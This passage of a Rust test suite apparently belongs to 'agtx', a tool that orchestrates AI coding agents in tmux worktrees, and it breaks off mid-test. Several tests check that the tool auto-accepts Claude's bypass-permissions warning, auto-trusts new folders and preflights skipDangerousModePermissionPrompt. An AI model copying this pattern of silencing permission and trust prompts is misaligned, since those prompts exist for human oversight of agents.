    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    std::fs::create_dir_all(dir.path().join(".cursor")).unwrap();
    std::fs::write(
        dir.path().join(".cursor/hooks.json"),
        r#"{"version":1,"hooks":{"stop":[{"command":"./mine.sh"}],"afterFileEdit":[{"command":"./fmt.sh"}]}}"#,
    )
    .unwrap();

    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], true);
    let v: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join(".cursor/hooks.json")).unwrap(),
    )
    .unwrap();

    // An event agtx does not touch survives untouched.
    assert_eq!(v["hooks"]["afterFileEdit"][0]["command"], "./fmt.sh");
    // An event agtx shares keeps the user's handler and gains agtx's.
    let stop = v["hooks"]["stop"].as_array().unwrap();
    assert_eq!(stop.len(), 2);
    assert_eq!(stop[0]["command"], "./mine.sh");
    assert!(stop[1]["command"]
        .as_str()
        .unwrap()
        .contains("hook --env cursor"));
}

/// Redeploying must replace agtx's own flat `{command}` entries, not stack them.
/// The Claude-shaped matcher looks inside a `hooks` array that cursor's entries
/// do not have, so a shape-blind match would duplicate on every deploy.
#[test]
#[cfg(feature = "test-mocks")]
fn test_cursor_hooks_do_not_accumulate_across_deploys() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], true);
    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], true);
    let v: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join(".cursor/hooks.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(v["hooks"]["stop"].as_array().unwrap().len(), 1);
}

/// Turning hooks off has to reach worktrees that already have them, or they keep
/// firing `agtx hook` for the life of the task.
#[test]
#[cfg(feature = "test-mocks")]
fn test_turning_hooks_off_unregisters_an_existing_worktree() {
    for name in ["claude", "gemini", "cursor", "grok", "antigravity"] {
        let dir = tempfile::tempdir().unwrap();
        let wt = dir.path().to_string_lossy().to_string();
        write_skills_to_worktree(&wt, dir.path(), &None, &[name], true);
        assert!(
            read_all_configs(dir.path())
                .iter()
                .any(|(_, b)| b.contains("hook --env")),
            "{name}: nothing was deployed to un-deploy"
        );

        write_skills_to_worktree(&wt, dir.path(), &None, &[name], false);
        for (rel, body) in read_all_configs(dir.path()) {
            assert!(
                !body.contains("hook --env"),
                "{name}: {rel} still fires agtx hook after agent_hooks was turned off"
            );
        }
    }
}

/// The user's own hooks must survive that un-deploy — pruning removes agtx's
/// entries, not the file.
#[test]
#[cfg(feature = "test-mocks")]
fn test_turning_hooks_off_leaves_the_users_own_hooks() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    std::fs::create_dir_all(dir.path().join(".cursor")).unwrap();
    std::fs::write(
        dir.path().join(".cursor/hooks.json"),
        r#"{"version":1,"hooks":{"stop":[{"command":"./mine.sh"}]}}"#,
    )
    .unwrap();
    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], true);
    write_skills_to_worktree(&wt, dir.path(), &None, &["cursor"], false);

    let v: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join(".cursor/hooks.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(v["hooks"]["stop"].as_array().unwrap().len(), 1);
    assert_eq!(v["hooks"]["stop"][0]["command"], "./mine.sh");
}

/// `--event` is driven by the spec, not by the agent's name, so an agent that
/// later needs it gets it from one field.
#[test]
fn test_argv_event_agents_carry_their_event_in_the_command() {
    for spec in agent::AGENT_SPECS {
        let Some(kind) = spec.hook_config else {
            continue;
        };
        let json = claude_shaped_hooks("/bin/agtx", spec.name, kind);
        for (event, _) in hook_status::hook_events(kind) {
            let cmd = json[event][0]["hooks"][0]["command"].as_str().unwrap_or("");
            let wants_argv = spec.hook_event_source == agent::HookEventSource::Argv;
            assert_eq!(
                cmd.contains("--event"),
                wants_argv,
                "{}: {event} command disagrees with hook_event_source",
                spec.name
            );
        }
    }
}

// ── submitting a message ────────────────────────────────────────────────────
//
// Pane text below is captured verbatim from live sessions. The bare-command case
// is the one that matters: a repaint is not a submit, and counting it as one
// leaves a command parked in a picker looking delivered while the phase never
// advances.

/// codex 0.144.5, after pasting a bare `$agtx-review`: the picker is open and the
/// command is still in the composer. Enter here *inserts*; it does not submit.
const CODEX_PARKED: &str = "\
• You have 1 usage limit reset available. Run /usage to use one.
› $agtx-review
  agtx-review  [Skill] Self-review completed work. Check for correctness…
  Press enter to insert or esc to close";

/// The same session after the command was actually submitted: the composer is
/// back to its placeholder and the text has moved into the scrollback.
const CODEX_SUBMITTED: &str = "\
• I'm using the agtx-review skill to inspect the task's diff and commits.
• Ran sed -n '1,240p' .codex/skills/agtx-review/SKILL.md
• Working (6s • esc to interrupt)
› Use /skills to list available skills
  gpt-5.6-sol default · /private/tmp/…";

/// cursor-agent 2026.08.25, parked with its picker open — the state
/// `submit_message` actually sees, not the tidied one left behind afterwards.
/// The suggestion renders *below* the composer box and the footer wraps the
/// worktree path, so the text being submitted sits eight lines off the bottom.
const CURSOR_PARKED: &str = "\
 ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  → /agtx-review
 ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
   → /agtx-review        Self-review completed work. Check for correctness…
  Auto · 9.6% · 4 files edited                          Run Everything
  /private/tmp/claude-501/-Users-fynn-workspace-agtx/69231794-89a8-48a
  5da1fead47/scratchpad/fixrun/cursor-agtx/.agtx/worktrees/21edaf6d-sm
  r-agtx · task/21edaf6d-smoke-cursor-agtx";

#[test]
fn test_composer_holds_sees_a_parked_command() {
    assert!(
        composer_holds(CODEX_PARKED, "$agtx-review"),
        "a command sitting in the composer must not read as submitted"
    );
    assert!(
        composer_holds(CURSOR_PARKED, "/agtx-review"),
        "an open picker and a wrapped footer put the text eight lines up; \
         the window must still reach it"
    );
}

#[test]
fn test_composer_holds_ignores_the_scrollback() {
    // The skill name appears in the agent's own narration above the composer.
    // Finding it there is proof the message went, not that it stayed.
    assert!(
        !composer_holds(CODEX_SUBMITTED, "$agtx-review"),
        "text echoed into the scrollback must not read as still-pending"
    );
}

/// The regression itself: a bare command needs a second Enter, and the first
/// one's repaint must not be mistaken for success.
#[test]
#[cfg(feature = "test-mocks")]
fn test_submit_message_presses_enter_again_when_the_picker_ate_the_first() {
    let mut mock = MockTmuxOperations::new();
    let seq = Arc::new(std::sync::Mutex::new(0usize));
    let c = seq.clone();
    // Parked before and after the first Enter — a repaint, not a submit — then
    // submitted once the second lands.
    mock.expect_capture_pane().returning(move |_| {
        let n = *c.lock().unwrap();
        Ok(if n < 2 { CODEX_PARKED } else { CODEX_SUBMITTED }.to_string())
    });
    let c2 = seq.clone();
    mock.expect_send_key()
        .times(2)
        .withf(|_, k| k == "Enter")
        .returning(move |_, _| {
            *c2.lock().unwrap() += 1;
            Ok(())
        });

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    submit_message(&ops, "t:1", "$agtx-review");
}

// ── first-launch dialog handling (wait_for_agent_ready) ──────────────────────

/// A native-binary agent changes `pane_current_command` the moment it execs, so
/// the process check wins that race — the dialog check has to run first or it
/// never runs at all. Observed live in a swebench container: Claude sat on the
/// bypass warning for 300s and the task prompt was typed into the menu.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_answers_claude_bypass_warning() {
    let mut mock = MockTmuxOperations::new();
    let mut seq = mockall::Sequence::new();
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "2")
        .returning(|_, _| Ok(()));
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "Enter")
        .returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("claude"),
        "WARNING: Claude Code running in Bypass Permissions mode\n  1. No, exit\n  2. Yes, I accept",
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// Claude's workspace-trust gate, shown *before* the bypass warning on the first
/// launch in any new directory — which is every task's worktree. Pane text
/// captured verbatim from claude 2.1.241; answered with "1" ("Yes, I trust this
/// folder"), not the "2" the bypass warning takes.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_answers_claude_workspace_trust() {
    let mut mock = MockTmuxOperations::new();
    let mut seq = mockall::Sequence::new();
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "1")
        .returning(|_, _| Ok(()));
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "Enter")
        .returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("claude"),
        "Accessing workspace:\n  /tmp/wt/task-slug\n\n\
         Quick safety check: Is this a project you created or one you trust?\n\
         Claude Code'll be able to read, edit, and execute files here.\n\
         \u{276f} 1. Yes, I trust this folder\n    2. No, exit\n\
         Enter to confirm \u{b7} Esc to cancel",
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// The two Claude gates are answered differently ("1" vs "2"), so a pane
/// showing one must never match the other's arm.
#[test]
#[cfg(feature = "test-mocks")]
fn test_claude_launch_dialogs_do_not_overlap() {
    let trust = "\u{276f} 1. Yes, I trust this folder\n    2. No, exit";
    let bypass = "WARNING: Claude Code running in Bypass Permissions mode\n  1. No, exit\n  2. Yes, I accept";
    let matches = |content: &str| -> Vec<&'static [&'static str]> {
        LAUNCH_DIALOGS
            .iter()
            .filter(|d| d.matches(content))
            .map(|d| d.answer)
            .collect()
    };
    assert_eq!(matches(trust), vec![&["1", "Enter"][..]], "trust dialog");
    assert_eq!(matches(bypass), vec![&["2", "Enter"][..]], "bypass dialog");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_answers_gemini_trust() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().times(2).returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("gemini"),
        "Do you trust the files in this folder?",
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// Ordinary agent output must never be mistaken for a dialog — a false positive
/// injects a stray "2" or "1" into the agent's composer.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_ignores_normal_output() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().never();

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(!dismiss_launch_dialog(
        &ops,
        "t:1",
        None,
        "❯ Claude Code\n  Ask anything\n✻ Cooked for 3s",
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// A dropped keystroke must be retried: an agent TUI that is not reading stdin
/// yet silently loses the answer. Observed in an emulated swebench container,
/// where a one-shot guard left Claude parked on the bypass warning.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_retries_while_the_pane_is_unchanged() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key()
        .times(4) // two rounds of ("2", Enter)
        .returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    let mut st = LaunchDialogState::default();
    let pane = "WARNING: Bypass Permissions mode\n  2. Yes, I accept";

    assert!(dismiss_launch_dialog(
        &ops, "t:1", None, pane, &mut st, true
    ));
    assert!(
        dismiss_launch_dialog(&ops, "t:1", None, pane, &mut st, true),
        "an unchanged pane means the answer was dropped — retry"
    );
}

/// ...but once the pane redraws, the answer landed. Resending would type a
/// stray "2" into the agent's live composer, ahead of the task prompt.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_stops_once_the_pane_redraws() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key()
        .times(2) // exactly one round
        .returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    let mut st = LaunchDialogState::default();

    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        None,
        "2. Yes, I accept",
        &mut st,
        true
    ));
    // Same dialog text, but the frame changed — it is the previous render.
    assert!(!dismiss_launch_dialog(
        &ops,
        "t:1",
        None,
        "2. Yes, I accept\n(redrawing...)",
        &mut st,
        true
    ));
}

/// A pattern that matches something which is not really a dialog must not
/// hammer the pane forever.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_gives_up_after_max_attempts() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key()
        .times((LAUNCH_DIALOG_MAX_ATTEMPTS as usize) * 2)
        .returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    let mut st = LaunchDialogState::default();
    let pane = "2. Yes, I accept";

    for _ in 0..LAUNCH_DIALOG_MAX_ATTEMPTS {
        assert!(dismiss_launch_dialog(
            &ops, "t:1", None, pane, &mut st, true
        ));
    }
    assert!(!dismiss_launch_dialog(
        &ops, "t:1", None, pane, &mut st, true
    ));
}

/// The two dialogs are tracked independently — answering Claude's must not
/// suppress Gemini's, which can appear in the same launch after a restart.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_tracks_dialogs_independently() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().times(4).returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    let mut answered = LaunchDialogState::default();
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        None,
        "2. Yes, I accept",
        &mut answered,
        true
    ));
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("gemini"),
        "Do you trust the files in this folder?",
        &mut answered,
        true
    ));
}

/// A project may ship its own `.claude/settings.local.json`, and agtx copies
/// `.claude/` into every worktree (AGENT_CONFIG_DIRS). The MCP/hook writer must
/// merge into that file, not replace it.
#[test]
#[cfg(feature = "test-mocks")]
fn test_write_skills_preserves_existing_claude_settings() {
    let dir = tempfile::tempdir().unwrap();
    let claude = dir.path().join(".claude");
    std::fs::create_dir_all(&claude).unwrap();
    // What the user's copied-in file might contain.
    std::fs::write(
        claude.join("settings.local.json"),
        r#"{
          "permissions": { "allow": ["Bash(cargo test:*)"] },
          "env": { "MY_VAR": "1" },
          "hooks": { "Stop": [{"hooks":[{"type":"command","command":"my-own-hook"}]}] }
        }"#,
    )
    .unwrap();

    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);

    let raw = std::fs::read_to_string(claude.join("settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();

    assert_eq!(
        v["permissions"]["allow"][0], "Bash(cargo test:*)",
        "permissions lost"
    );
    assert_eq!(v["env"]["MY_VAR"], "1", "env lost");
    assert_eq!(v["enableAllProjectMcpServers"], serde_json::json!(true));
    // agtx's hooks must be present...
    assert!(v["hooks"]["SessionStart"][0]["hooks"][0]["command"]
        .as_str()
        .unwrap_or("")
        .contains("hook --env"));
    // ...without discarding the user's own hook on an event agtx also uses.
    let stop = v["hooks"]["Stop"].as_array().expect("Stop missing");
    let has_user_hook = stop.iter().any(|d| {
        d["hooks"]
            .as_array()
            .map_or(false, |h| h.iter().any(|x| x["command"] == "my-own-hook"))
    });
    assert!(has_user_hook, "user's own Stop hook was discarded: {}", raw);
}

/// Re-deploying into an existing worktree (e.g. an agent switch) must replace
/// agtx's own hook entries, not append a second copy — duplicates would fire
/// `agtx hook` twice per event, forever.
#[test]
#[cfg(feature = "test-mocks")]
fn test_write_skills_is_idempotent_for_hooks() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);

    let raw = std::fs::read_to_string(dir.path().join(".claude/settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
    for event in ["SessionStart", "Stop", "PreToolUse"] {
        assert_eq!(
            v["hooks"][event].as_array().map(|a| a.len()),
            Some(1),
            "{} accumulated duplicate hook entries",
            event
        );
    }
}

/// A corrupt settings file must not take the worktree down with it — agtx
/// starts fresh rather than refusing to deploy.
#[test]
#[cfg(feature = "test-mocks")]
fn test_write_skills_survives_corrupt_claude_settings() {
    let dir = tempfile::tempdir().unwrap();
    let claude = dir.path().join(".claude");
    std::fs::create_dir_all(&claude).unwrap();
    std::fs::write(claude.join("settings.local.json"), "{ not json").unwrap();

    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);

    let raw = std::fs::read_to_string(claude.join("settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
    assert_eq!(v["enableAllProjectMcpServers"], serde_json::json!(true));
}

/// Under `skip_worktree` the "worktree" IS the project root, so every task
/// deploys into the *same* `.claude/settings.local.json`. The registered command
/// must therefore be task-agnostic: a per-task command would mean the last
/// deploy re-points every other task's agent at its own status file.
#[test]
#[cfg(feature = "test-mocks")]
fn test_skip_worktree_tasks_share_one_task_agnostic_hook() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().to_string_lossy().to_string();

    // Two tasks, same "worktree" (the project root).
    write_skills_to_worktree(&root, dir.path(), &None, &["claude"], true);
    write_skills_to_worktree(&root, dir.path(), &None, &["claude"], true);

    let raw = std::fs::read_to_string(dir.path().join(".claude/settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
    let stop = v["hooks"]["Stop"].as_array().unwrap();

    assert_eq!(
        stop.len(),
        1,
        "deploys must not accumulate entries: {}",
        raw
    );
    let cmd = stop[0]["hooks"][0]["command"].as_str().unwrap();
    assert!(
        cmd.contains("hook --env"),
        "command must carry no task id, or tasks would clobber each other: {}",
        cmd
    );
}

// ── binary-path drift ────────────────────────────────────────────────────────

/// Deploying records which binary did it, so the startup check is O(1) per task
/// instead of parsing seven config formats.
#[test]
#[cfg(feature = "test-mocks")]
fn test_deploy_writes_a_binary_marker() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);

    let marker = read_deploy_marker(dir.path()).expect("marker missing");
    let current = std::env::current_exe()
        .unwrap()
        .to_string_lossy()
        .to_string();
    assert_eq!(marker, current);
}

/// The regression this whole fix exists for: after the binary moves, agtx must
/// still recognise its own hook entries. A path-prefix matcher would not, and a
/// redeploy would keep the dead entry *and* add a live one.
#[test]
#[cfg(feature = "test-mocks")]
fn test_hooks_are_replaced_not_duplicated_after_the_binary_moves() {
    let dir = tempfile::tempdir().unwrap();
    let claude = dir.path().join(".claude");
    std::fs::create_dir_all(&claude).unwrap();
    // A deployment from a binary that no longer exists at that path.
    std::fs::write(
        claude.join("settings.local.json"),
        r#"{"hooks":{"Stop":[{"hooks":[{"type":"command",
            "command":"/old/gone/agtx hook --env claude"}]}]}}"#,
    )
    .unwrap();

    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);

    let raw = std::fs::read_to_string(claude.join("settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
    let stop = v["hooks"]["Stop"].as_array().unwrap();

    assert_eq!(stop.len(), 1, "stale entry was not replaced: {}", raw);
    assert!(
        !raw.contains("/old/gone/agtx"),
        "dead path survived: {}",
        raw
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_agtx_hook_command_ignores_unrelated_hooks() {
    assert!(is_agtx_hook_command("/any/path/agtx hook --env claude"));
    assert!(is_agtx_hook_command("agtx hook --env claude"));
    assert!(!is_agtx_hook_command("my-own-linter --fix"));
    // A user hook that merely mentions agtx must not be treated as ours.
    assert!(!is_agtx_hook_command("echo agtx is running"));
}

/// Claude Code ~2.1 gates `--dangerously-skip-permissions` behind an interactive
/// acceptance. agtx always launches with that flag and every worktree is a fresh
/// directory, so the acceptance must be preflighted or the agent parks on the
/// dialog and the task prompt is typed into the menu.
#[test]
#[cfg(feature = "test-mocks")]
fn test_claude_settings_preflight_bypass_acceptance() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    write_skills_to_worktree(&wt, dir.path(), &None, &["claude"], true);

    let raw = std::fs::read_to_string(dir.path().join(".claude/settings.local.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
    assert_eq!(
        v["skipDangerousModePermissionPrompt"],
        serde_json::json!(true)
    );
}

/// Deploying one skill for every supported agent lands at exactly these paths.
///
/// `deploy_skill` and
/// `write_skills_to_worktree` each carried their own copy of this layout branch
/// and had already drifted apart, so the layouts are pinned as literals here
/// rather than derived from the same table the code reads.
#[test]
fn test_deploy_skill_paths_for_every_agent() {
    let expected: &[(&str, &str)] = &[
        ("claude", ".claude/commands/agtx/plan.md"),
        ("copilot", ".github/agents/agtx/plan.md"),
        ("gemini", ".gemini/commands/agtx/plan.toml"),
        ("codex", ".codex/skills/agtx-plan/SKILL.md"),
        ("cursor", ".cursor/skills/agtx-plan/SKILL.md"),
        ("grok", ".grok/skills/agtx-plan/SKILL.md"),
        ("antigravity", ".agents/skills/agtx-plan/SKILL.md"),
        ("opencode", ".opencode/command/agtx-plan.md"),
    ];
    let content = "---\nname: agtx-plan\ndescription: Plan the work\n---\n\nbody\n";

    for (agent, rel) in expected {
        let dir = tempfile::tempdir().unwrap();
        deploy_skill(dir.path(), "agtx-plan", content, agent);

        let native = dir.path().join(rel);
        assert!(native.exists(), "{agent}: expected {rel}");
        assert!(
            !std::fs::read_to_string(&native).unwrap().is_empty(),
            "{agent}: {rel} is empty"
        );

        // The canonical copy is written for every agent, whatever the layout.
        assert!(
            dir.path().join(".agtx/skills/agtx-plan/SKILL.md").exists(),
            "{agent}: canonical copy missing"
        );
    }
}

/// Copilot declares `mcp_config: None` — agtx does not wire it to the MCP
/// server, so no config file should appear anywhere in its worktree. Guards the
/// new `Option<McpConfigKind>`: before it, "no MCP arm" and "an arm that does
/// nothing" were indistinguishable.
#[test]
fn test_write_skills_to_worktree_writes_no_mcp_config_for_copilot() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();

    write_skills_to_worktree(&wt, dir.path(), &None, &["copilot"], false);

    // Its skills still deploy — only the MCP wiring is absent.
    assert!(dir.path().join(".github/agents/agtx/plan.md").exists());

    for absent in [
        ".mcp.json",
        "opencode.json",
        ".codex/config.toml",
        ".gemini/settings.json",
        ".cursor/mcp.json",
        ".grok/config.toml",
        ".agents/mcp_config.json",
    ] {
        assert!(
            !dir.path().join(absent).exists(),
            "copilot should get no MCP config, found {absent}"
        );
    }
}

/// `AGENT_COMMANDS` and `AGENT_ACTIVE_INDICATORS` are now derived from
/// `AGENT_SPECS`. These pin the *result* against the literals they replaced, so
/// the derivation is checked rather than assumed — a test that rebuilt them from
/// the same table would assert nothing.
#[test]
fn test_agent_commands_derivation_matches_the_previous_literals() {
    let mut got: Vec<&str> = AGENT_COMMANDS.to_vec();
    got.sort_unstable();
    let mut want = vec![
        "claude", "codex", "gemini", "copilot", "opencode", "agent", "grok", "agy",
        // pi. Only fires on Linux — macOS fixes `p_comm` at exec, so the pane
        // reports `node` and pi's scoped indicator does the detecting there.
        // `node` itself must never join this list: it is every Ink agent's pane
        // name, and would make any node process read as a live agent.
        "pi",
        // Not agent binaries, but a Python entry point must not read as "shell".
        "python3", "python",
    ];
    want.sort_unstable();
    assert_eq!(got, want);
}

#[test]
fn test_active_indicator_derivation_matches_the_previous_literals() {
    let mut got: Vec<&str> = AGENT_ACTIVE_INDICATORS.to_vec();
    got.sort_unstable();
    let mut want = vec![
        "Claude Code",       // Claude
        "Type your message", // Gemini
        "Ask anything",      // OpenCode
        "Cursor Agent",      // Cursor
        "OpenAI Codex",      // Codex
        "Grok Build",        // Grok — splash/footer
        "Shift+Tab:mode",    // Grok — session footer once a turn has run
        // Antigravity, added after the smoke run found it had no readiness
        // signal at all: its npm wrapper reports `bash` in pane_current_command,
        // and its splash produces two pane changes where the stabilisation
        // fallback needs three. Its trust dialog's footer reads
        // "↑/↓ Navigate · enter Confirm", so this cannot fire while blocked.
        "? for shortcuts",
    ];
    want.sort_unstable();
    // pi's "%/" is deliberately absent: it lives in `scoped_indicators`, which
    // is matched only in a pane agtx knows is running pi. In this flat list —
    // used for panes whose agent is unknown — it would report an exited claude
    // or codex as still running the moment output contained "85%/90%".
    assert!(!got.contains(&"%/"));
    assert_eq!(got, want);
}

/// The arm most easily lost in migration: an agent with no exit command must get
/// Ctrl+C, not a `/exit` typed into a TUI that does not understand it.
#[test]
fn test_exit_command_per_agent() {
    let table = [
        ("claude", Some("/exit")),
        ("opencode", Some("/exit")),
        ("copilot", Some("/exit")),
        ("antigravity", Some("/exit")),
        ("gemini", Some("/quit")),
        ("grok", Some("/quit")),
        ("pi", Some("/quit")),
        ("codex", None),
        ("cursor", None),
    ];
    for (agent, want) in table {
        assert_eq!(
            crate::agent::spec(agent).unwrap().exit_command,
            want,
            "{agent}"
        );
    }
    assert_covers_every_agent(&table.map(|(a, _)| a), "test_exit_command_per_agent");
    // An agent agtx has never heard of keeps the historical default.
    assert!(crate::agent::spec("mistral").is_none());
}

/// Which send path each agent takes, pinned as literals. `Combined` is the
/// bracketed-paste path; `OpenCodePicker` is the one flow where the text must
/// arrive in two pieces by design.
#[test]
fn test_send_strategy_per_agent() {
    use crate::agent::SendStrategy;
    let table = [
        ("claude", SendStrategy::Generic),
        ("copilot", SendStrategy::Generic),
        ("grok", SendStrategy::Generic),
        ("gemini", SendStrategy::Combined),
        ("codex", SendStrategy::Combined),
        ("cursor", SendStrategy::Combined),
        ("antigravity", SendStrategy::Combined),
        ("pi", SendStrategy::Combined),
        ("opencode", SendStrategy::OpenCodePicker),
    ];
    for (agent, want) in table {
        assert_eq!(
            crate::agent::spec(agent).unwrap().send_strategy,
            want,
            "{agent}"
        );
    }
    assert_covers_every_agent(&table.map(|(a, _)| a), "test_send_strategy_per_agent");
}

/// Which agents have a verified clear-context command (issue #46). An agent with
/// `None` must fall through to a normal send rather than typing a command it does
/// not understand into its composer.
#[test]
fn test_clear_context_command_per_agent() {
    let table = [
        ("claude", Some("/clear")),
        ("pi", Some("/new")),
        ("codex", None),
        ("gemini", None),
        ("cursor", None),
        ("antigravity", None),
        ("opencode", None),
        ("grok", None),
        ("copilot", None),
    ];
    for (agent, want) in table {
        assert_eq!(
            crate::agent::spec(agent).unwrap().clear_context_command,
            want,
            "{agent}"
        );
    }
    assert_covers_every_agent(
        &table.map(|(a, _)| a),
        "test_clear_context_command_per_agent",
    );
}

/// Every agent that *has* a clear-context command must be reachable by a delivery
/// path that actually submits it.
///
/// The gap this pins cost pi its whole phase command: `/new` was declared while
/// the send was an unconditional `send_keys`, which pi's own spec comment records
/// as leaving the text unsent — so the skill+prompt was pasted onto the parked
/// `/new` and submitted as one message. `SendStrategy::Combined` now takes the
/// paste-and-confirm path and `Generic` keeps the typed one, so what is asserted
/// is that the strategy is one the send has an arm for.
#[test]
fn test_clear_context_agents_have_a_delivery_path() {
    use crate::agent::SendStrategy;
    for spec in crate::agent::AGENT_SPECS.iter() {
        if spec.clear_context_command.is_none() {
            continue;
        }
        assert!(
            matches!(
                spec.send_strategy,
                SendStrategy::Generic | SendStrategy::Combined
            ),
            "{}: clear_context_command is delivered by send_skill_and_prompt, \
             which has no arm for {:?}",
            spec.name,
            spec.send_strategy
        );
    }
}

/// Helper for the per-agent literal tables: a new agent must be added to each one
/// rather than silently escaping the lock it exists to provide. This is how pi
/// slipped past three of them at once.
fn assert_covers_every_agent(covered: &[&str], table: &str) {
    let missing: Vec<&str> = crate::agent::AGENT_SPECS
        .iter()
        .map(|s| s.name)
        .filter(|n| !covered.contains(n))
        .collect();
    assert!(missing.is_empty(), "{table} is missing: {missing:?}");
}

/// `LAUNCH_DIALOGS` is derived from `AGENT_SPECS`. Pinned against literals, and
/// asserting `Session`-scope dialogs stay out — they are matched per agent, not
/// against any pane.
#[test]
fn test_launch_dialog_derivation_matches_the_previous_literals() {
    let mut got: Vec<(Vec<&str>, Vec<&str>)> = LAUNCH_DIALOGS
        .iter()
        .map(|d| (d.patterns.to_vec(), d.answer.to_vec()))
        .collect();
    got.sort();
    // The first three are the literals this derivation replaced; the two codex
    // entries were added afterwards, each verified against codex-cli 0.144.5,
    // and antigravity's after its trust dialog was found parking every task.
    let mut want = vec![
        (
            vec!["Yes, I accept", "I accept the risk"],
            vec!["2", "Enter"],
        ),
        (vec!["Yes, I trust this folder"], vec!["1", "Enter"]),
        (
            vec!["Do you trust the files in this folder?"],
            vec!["1", "Enter"],
        ),
        (
            vec!["Do you trust the contents of this directory?"],
            vec!["1", "Enter"],
        ),
        (vec!["Update now (runs"], vec!["2", "Enter"]),
        // "Continue without trusting" — declines rather than grants, so it is
        // answered like the update prompt above rather than left to the user.
        (vec!["Hooks need review"], vec!["3", "Enter"]),
        // Enter alone: an arrow-navigated menu with the safe option preselected.
        (
            vec!["Do you trust the contents of this project?"],
            vec!["Enter"],
        ),
        // Cursor advertises its own access key, so that is what it is sent.
        (vec!["Workspace Trust Required"], vec!["a"]),
    ];
    want.sort();
    assert_eq!(got, want);

    // Codex's MCP approval is Session-scope and must not leak into the flat list:
    // there it would fire for any agent's pane, and during startup too.
    assert!(
        !LAUNCH_DIALOGS
            .iter()
            .any(|d| d.patterns.contains(&"MCP server to run tool")),
